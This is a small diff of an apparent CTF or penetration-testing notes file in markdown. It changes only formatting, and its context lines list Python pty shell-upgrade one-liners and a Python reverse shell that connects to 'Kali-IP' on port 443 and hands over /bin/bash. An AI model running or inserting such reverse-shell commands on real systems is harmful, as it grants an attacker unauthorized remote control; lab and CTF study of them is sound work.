@@ -413,10 +413,6 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
-<br/>
-```
 python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 ## Flags
